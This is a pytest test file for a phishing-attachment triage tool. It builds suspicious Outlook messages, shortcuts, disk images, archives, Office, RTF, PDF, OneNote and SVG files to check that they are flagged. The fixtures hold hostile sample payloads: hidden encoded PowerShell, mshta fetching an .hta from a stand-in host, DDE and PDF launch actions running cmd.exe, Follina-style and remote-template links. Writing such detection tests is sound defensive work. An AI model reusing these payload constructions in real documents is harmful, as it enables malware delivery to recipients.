"""The file formats phish arrive in, each built here and triaged end to end:
Outlook .msg, shortcuts, disk images, RAR, 7-Zip, tar and gzip, password
ZIPs, OneNote, RTF, Office and PDF documents, winmail.dat and invites."""

import struct
import time
import zipfile

import pytest

import filebuild as fb
from olebuild import build_msg, write_cfb
from phishhawk.formats import archives, disk, documents, lnk, mailparts
from phishhawk.formats.cfb import CfbError, CompoundFile
from phishhawk.formats.msg import MsgError, decompress_rtf, msg_to_bytes, rtf_to_text
from phishhawk.pipeline import triage_bytes

from conftest import build_eml


def labels(a):
    return [s.label for s in a.signals]


def severity(a, fragment):
    return [s.severity for s in a.signals if fragment in s.label]


def attach(data, name, maintype="application", subtype="octet-stream", **kw):
    return triage_bytes(build_eml(attachments=[(data, maintype, subtype, name)], **kw))


# --------------------------------------------------------------- Outlook .msg --

HEADERS = ("Received: from mail.paypa1-secure.top (mail.paypa1-secure.top [185.243.115.22])\r\n"
           "Authentication-Results: mx.example-corp.co.uk; spf=fail smtp.mailfrom=paypa1-secure.top; "
           "dkim=none; dmarc=fail header.from=paypal.com\r\n"
           "From: \"PayPal\" <service@paypal.com>\r\nTo: dev@example-corp.co.uk\r\n"
           "Subject: Your account is limited\r\nMessage-ID: <1@paypa1-secure.top>\r\n"
           "Content-Type: text/plain\r\n")


def test_an_outlook_message_keeps_its_original_headers():
    raw = build_msg(headers=HEADERS, subject="ignored when headers exist", body="Verify your account: "
                    "https://paypa1-secure.top/login", to=[("Dev", "dev@example-corp.co.uk")])
    a = triage_bytes(raw)
    assert a.subject == "Your account is limited" and a.from_address == "service@paypal.com"
    assert a.auth == {"spf": "fail", "dkim": "none", "dmarc": "fail"}
    assert a.originating_ip == "185.243.115.22"
    assert any("the From line is probably forged" in label for label in labels(a))
    assert a.verdict == "LIKELY PHISHING"


def test_an_outlook_message_without_headers_is_rebuilt_from_its_properties():
    raw = build_msg(subject="Invoice 2291", sender="billing@invoices.example", sender_name="Accounts",
                    to=[("Dev", "dev@example-corp.co.uk")], html="<a href='https://evil.example/inv'>Invoice</a>",
                    attachments=[{"name": "invoice.htm", "mime": "text/html",
                                  "data": b"<form action='https://evil.example/p'><input type=password></form>"}],
                    submit_ticks=133000000000000000)
    eml = msg_to_bytes(raw).decode()
    assert "From: Accounts <billing@invoices.example>" in eml and "To: Dev <dev@example-corp.co.uk>" in eml
    assert "Date: " in eml
    a = triage_bytes(raw)
    assert "https://evil.example/inv" in [u.url for u in a.urls]
    assert any("credential form" in label for label in labels(a))


def test_an_rtf_only_outlook_body_is_read():
    rtf = (b'{\\rtf1\\ansi Your mailbox is full. {\\field{\\*\\fldinst HYPERLINK "https://owa-reset.top/login"}'
           b"{\\fldrslt Click}}\\par}")
    a = triage_bytes(build_msg(subject="Mailbox", rtf=fb.lzfu(rtf)))
    assert "https://owa-reset.top/login" in [u.url for u in a.urls]


def test_a_message_attached_to_an_outlook_message_is_the_one_triaged():
    inner = {"subject": "Payroll update", "sender": "hr@payro11-update.top", "body": "https://payro11-update.top/x"}
    a = triage_bytes(build_msg(subject="FW: is this phishing?", sender="dev@example-corp.co.uk",
                               attachments=[{"name": "Payroll update.msg", "message": inner}]))
    assert a.subject == "Payroll update" and a.reported_by["from"] == "dev@example-corp.co.uk"


def test_a_msg_reported_inside_an_eml_is_unwrapped():
    reported = build_msg(subject="Unusual sign-in", sender="alerts@m1crosoft-security.top", body="hi")
    a = triage_bytes(build_eml(subject="Phish?", attachments=[(reported, "application", "vnd.ms-outlook",
                                                                 "Unusual sign-in.msg")]))
    assert a.subject == "Unusual sign-in" and a.from_domain == "m1crosoft-security.top"


def test_damaged_compound_files_are_refused_cleanly():
    good = write_cfb({("a",): b"x" * 5000})
    looped = bytearray(good)
    struct.pack_into("<I", looped, 512, 0)  # FAT entry 0 points at itself: a loop
    for data in (good[:600], bytes(looped), b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\xff" * 600):
        try:  # refused, or read as far as it goes: never a crash or a hang
            cfb = CompoundFile(data)
            for entry in cfb.streams():
                cfb.read(entry)
        except CfbError:
            pass
    with pytest.raises(MsgError):
        msg_to_bytes(good)  # a compound file, but no message properties
    a = triage_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 1000)
    assert a.verdict == "NO STRONG INDICATORS"


def test_compressed_rtf():
    rtf = b"{\\rtf1 hello {\\*\\generator x}world}"
    assert decompress_rtf(fb.lzfu(rtf)) == rtf
    assert rtf_to_text(rtf)[0] == "hello world"
    stored = struct.pack("<II4sI", len(rtf) + 12, len(rtf), b"MELA", 0) + rtf
    assert decompress_rtf(stored) == rtf
    with pytest.raises(MsgError):
        decompress_rtf(b"short")


# ------------------------------------------------------------------ shortcuts --

def test_a_shortcut_that_starts_powershell():
    a = attach(fb.lnk(), "Invoice_2291.pdf.lnk")
    shortcut = [s for s in a.signals if s.label.startswith("shortcut Invoice_2291.pdf.lnk")]
    assert [s.severity for s in shortcut] == ["high"]
    assert "starts powershell" in shortcut[0].label and "encoded PowerShell" in shortcut[0].label
    assert "T1059.001" in shortcut[0].techniques
    details = next(f for f in a.attachments if f.filename.endswith(".lnk")).details["lnk"]
    assert details["arguments"].startswith("-w hidden -enc")


def test_a_shortcut_that_downloads_gives_up_its_url():
    a = attach(fb.lnk(target="C:\\Windows\\System32\\mshta.exe", arguments="https://cdn-files.top/a.hta"),
               "scan.lnk")
    assert "https://cdn-files.top/a.hta" in [u.url for u in a.urls]
    assert any("T1218.005" in s.techniques for s in a.signals)


def test_shortcut_parser_refuses_garbage():
    for data in (b"", b"L\0\0\0" * 3, fb.lnk()[:80]):
        with pytest.raises(ValueError):
            lnk.parse_lnk(data)


# ---------------------------------------------------------------- disk images --

def test_an_iso_hiding_a_shortcut():
    a = attach(fb.iso({"invoice.lnk": fb.lnk(), "readme.txt": b"hi"}), "Invoice.iso")
    assert severity(a, "disk image Invoice.iso delivers 2 file(s) without the Mark of the Web") == ["high"]
    child = next(f for f in a.attachments if f.filename == "INVOICE.LNK")
    assert child.parent == "Invoice.iso" and child.true_type == "lnk"
    assert any(label.startswith("shortcut INVOICE.LNK") for label in labels(a))


def test_a_floppy_image_hiding_an_executable():
    a = attach(fb.fat12({"setup.exe": b"MZ" + b"\0" * 5000, "notes.txt": b"x"}), "Invoice.img")
    assert any("disk image Invoice.img" in label for label in labels(a))
    exe = next(f for f in a.attachments if f.filename == "SETUP.EXE")
    assert exe.true_type == "pe" and exe.size == 5002


def test_disk_readers_survive_garbage():
    iso = bytearray(fb.iso({"a.txt": b"x"}))
    iso[18 * 2048:18 * 2048 + 2048] = b"\x22" * 2048  # a directory full of nonsense records
    disk.list_iso(bytes(iso))
    with pytest.raises(ValueError):
        disk.list_iso(b"\0" * 40000)
    fat = bytearray(fb.fat12({"a.txt": b"x" * 2000}))
    fat[512:512 + 4608] = b"\x02\x00" * 2304  # a FAT whose chains all loop
    disk.list_fat(bytes(fat))


# ----------------------------------------------------------------- archives --

def test_a_rar_listing_shows_the_payload():
    a = attach(fb.rar5(["docs/Invoice.pdf.lnk", "readme.txt"]), "Invoice.rar")
    assert severity(a, "RAR archive Invoice.rar holds docs/Invoice.pdf.lnk") == ["high"]


def test_an_archive_that_encrypts_its_names():
    a = attach(fb.rar5([], encrypted_headers=True), "secure.rar")
    assert severity(a, "encrypts even its file names") == ["high"]


def test_a_7z_listing_shows_the_payload():
    a = attach(fb.seven_zip(["Invoice.pdf.js", "logo.png"]), "Invoice.7z")
    assert any("7Z archive Invoice.7z holds Invoice.pdf.js" in label for label in labels(a))


def test_rar_and_7z_readers_refuse_garbage():
    for data in (b"Rar!\x1a\x07\x01\x00" + b"\xff" * 50, b"Rar!\x1a\x07\x00" + b"\x00" * 3):
        archives.list_rar(data)  # truncated: an empty or partial listing, no exception
    for data in (b"7z\xbc\xaf\x27\x1c" + b"\0" * 20, b"7z\xbc\xaf\x27\x1c\0\x04" + b"\xff" * 30):
        with pytest.raises(ValueError):
            archives.list_7z(data)


def test_tar_gz_members_are_inspected():
    import io
    import tarfile

    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        page = b"<form action='https://evil.example/p'><input type='password'></form>"
        info = tarfile.TarInfo("login.html")
        info.size = len(page)
        archive.addfile(info, io.BytesIO(page))
    a = attach(buffer.getvalue(), "statement.tar.gz")
    assert any("credential form" in label for label in labels(a))
    assert [f.filename for f in a.attachments] == ["statement.tar.gz", "statement.tar", "login.html"]


def test_a_zip_password_given_in_the_message_opens_it():
    locked = fb.encrypted_zip({"Invoice.js": b"new ActiveXObject('WScript.Shell').Run('calc')"}, "Inv2291")
    a = triage_bytes(build_eml(text="Your invoice is attached. Password: Inv2291",
                               attachments=[(locked, "application", "zip", "Invoice.zip")]))
    assert severity(a, "the message gives the password for its archive Invoice.zip") == ["high"]
    member = next(f for f in a.attachments if f.filename == "Invoice.js")
    assert member.parent == "Invoice.zip" and member.size > 0
    assert severity(a, "risky attachment: Invoice.js") == ["high"]


def test_a_wrong_password_leaves_the_archive_closed():
    locked = fb.encrypted_zip({"Invoice.js": b"x"}, "right")
    a = triage_bytes(build_eml(text="Password: wrong", attachments=[(locked, "application", "zip", "a.zip")]))
    assert not any(f.filename == "Invoice.js" and f.parent for f in a.attachments)
    assert severity(a, "password-protected archive: a.zip") == ["high"]


def test_nesting_and_file_budgets_end_the_walk():
    data = fb.plain_zip({"deep.txt": b"x"})
    for level in range(6):
        data = fb.plain_zip({"level%d.zip" % level: data})
    a = attach(data, "nested.zip")
    assert any("nested too deep" in note for f in a.attachments for note in f.notes)
    many = fb.plain_zip({"f%04d.txt" % i: b"x" for i in range(1000)})
    started = time.perf_counter()
    b = attach(many, "many.zip")
    assert len(b.attachments) <= 202 and time.perf_counter() - started < 5


# ---------------------------------------------------------------- documents --

def _docx(parts):
    return fb.plain_zip({"[Content_Types].xml": b"<Types/>", **parts})


def test_a_word_document_with_a_remote_template():
    rels = (b'<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
            b'relationships/attachedTemplate" Target="https://cdn-office.top/t.dotm" TargetMode="External"/>'
            b"</Relationships>")
    a = attach(_docx({"word/_rels/settings.xml.rels": rels}), "Report.docx")
    assert severity(a, "Report.docx loads a remote template") == ["high"]
    assert "https://cdn-office.top/t.dotm" in [u.url for u in a.urls]


def test_follina_and_dde():
    rels = (b'<Relationships><Relationship Id="rId9" Type=".../oleObject" TargetMode="External" '
            b'Target="mhtml:https://x.top/a.html!x-usc:https://x.top/a.html"/></Relationships>')
    follina = attach(_docx({"word/_rels/document.xml.rels": rels}), "cv.docx")
    assert severity(follina, "Windows protocol handler") == ["high"]
    body = (b'<w:document><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" '
            b"</w:instrText></w:document>")
    dde = attach(_docx({"word/document.xml": body}), "order.docx")
    assert severity(dde, "a DDE field in order.docx") == ["high"]


def test_legacy_office_macros_and_packages():
    vba = write_cfb({("Macros", "VBA", "dir"): b"\x01" * 10, ("WordDocument",): b"\0" * 100})
    a = attach(vba, "invoice.doc")
    assert severity(a, "macro-enabled document: invoice.doc") == ["high"]
    book = struct.pack("<HH", 0x0809, 4) + b"\0" * 4 + struct.pack("<HH", 0x0085, 8) + b"\0\0\0\0\0\x01\x00\x00"
    xlm = attach(write_cfb({("Workbook",): book}), "prices.xls")
    assert severity(xlm, "Excel 4.0 (XLM) macros") == ["high"]
    native = struct.pack("<IH", 0, 2) + b"run.bat\0C:\\run.bat\0" + b"\0" * 4 + struct.pack("<I", 0) \
        + struct.pack("<I", 12) + b"@echo off\r\n "
    package = attach(write_cfb({("ObjectPool", "_1", "\x01Ole10Native"): native}), "form.doc")
    assert any(f.filename == "run.bat" and f.parent == "form.doc" for f in package.attachments)


def test_pdf_scripts_launch_actions_and_embedded_files():
    auto = fb.pdf([b"<< /Type /Catalog /OpenAction 2 0 R >>", b"<< /S /JavaScript /JS (app.alert(1)) >>"])
    assert severity(attach(auto, "a.pdf"), "runs JavaScript as soon as it opens") == ["high"]
    escaped = fb.pdf([b"<< /Type /Catalog /OpenAction << /S /J#61vaScript /JS (x) >> >>"])
    assert severity(attach(escaped, "b.pdf"), "runs JavaScript") == ["high"]
    launch = fb.pdf([b"<< /S /Launch /F (cmd.exe) >>"])
    assert severity(attach(launch, "c.pdf"), "launch action") == ["high"]
    embedded = fb.pdf([b"<< /Type /Filespec /F (payload.hta) /EF << /F 2 0 R >> >>",
                       fb.pdf_stream(b"/Type /EmbeddedFile", b"<script>new ActiveXObject('x')</script>")])
    a = attach(embedded, "d.pdf")
    assert severity(a, "carries an embedded file") == ["medium"]
    assert any(f.filename == "payload.hta" and f.parent == "d.pdf" for f in a.attachments)


def test_rtf_exploit_objects_and_templates():
    equation = b"{\\rtf1{\\object\\objemb{\\*\\objclass Equation.3}\\objdata 01050000020000000b000000}}"
    assert severity(attach(equation, "order.doc"), "CVE-2017-11882") == ["high"]
    template = b"{\\rtf1{\\*\\template http://cdn-office.top/t.dot}hello}"
    a = attach(template, "cv.rtf")
    assert severity(a, "cv.rtf loads a remote template") == ["high"]
    assert "http://cdn-office.top/t.dot" in [u.url for u in a.urls]


def test_a_onenote_page_hiding_a_script():
    blob = b"<script>new ActiveXObject('WScript.Shell').Run('powershell')</script>"
    one = documents.ONENOTE_SIGNATURE + b"\0" * 100 + bytes.fromhex("e716e3bd65261145a4c48d4d0b7a9eac") \
        + struct.pack("<Q", len(blob)) + b"\0" * 12 + blob + b"\0" * 50
    a = attach(one, "Invoice.one")
    assert severity(a, "OneNote file Invoice.one hides a runnable file") == ["high"]


def test_an_svg_that_runs_script():
    svg = b'<svg xmlns="http://www.w3.org/2000/svg"><script>location="https://evil.example/"</script></svg>'
    svg_signal = severity(attach(svg, "voicemail.svg", "image", "svg+xml"), "runs JavaScript (SVG smuggling)")
    assert svg_signal == ["high"]
    handler = b'<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(1)"><rect/></svg>'
    assert severity(attach(handler, "fax.svg", "image", "svg+xml"), "SVG smuggling") == ["high"]


# ------------------------------------------------------- winmail.dat, invites --

def test_winmail_dat_gives_up_its_attachments_and_body():
    blob = fb.tnef({"invoice.exe": b"MZ" + b"\0" * 100}, "Pay the invoice at https://pay-now.top/x")
    a = attach(blob, "winmail.dat", "application", "ms-tnef")
    assert any(f.filename == "invoice.exe" and f.parent == "winmail.dat" for f in a.attachments)
    assert "https://pay-now.top/x" in [u.url for u in a.urls]
    assert severity(a, "risky attachment: invoice.exe") == ["high"]


def test_calendar_invites():
    ics = ("BEGIN:VCALENDAR\r\nMETHOD:REQUEST\r\nBEGIN:VEVENT\r\nORGANIZER;CN=HR:mailto:hr@payroll-portal.top\r\n"
           "SUMMARY:Salary review\r\nDESCRIPTION:Confirm your details at https://payroll-portal.top/l\r\n ogin\r\n"
           "END:VEVENT\r\nEND:VCALENDAR\r\n")
    a = triage_bytes(build_eml(sender="<hr@example-corp.co.uk>", attachments=[(ics.encode(), "text", "calendar",
                                                                              "invite.ics")]))
    assert "https://payroll-portal.top/login" in [u.url for u in a.urls]
    assert a.calendar[0]["organizer"] == "hr@payroll-portal.top"
    assert severity(a, "calendar organiser") == ["medium"]
    invite = mailparts.parse_calendar(ics)
    assert invite.summary == "Salary review" and invite.method == "REQUEST"


def test_zip_member_listing_is_kept_when_members_are_skipped():
    big = fb.plain_zip({"x.bin": b"\0" * 10, "payload.scr": b"MZ"})
    with zipfile.ZipFile(__import__("io").BytesIO(big)) as archive:
        assert len(archive.namelist()) == 2
    a = attach(big, "x.zip")
    assert any(f.filename == "payload.scr" for f in a.attachments)
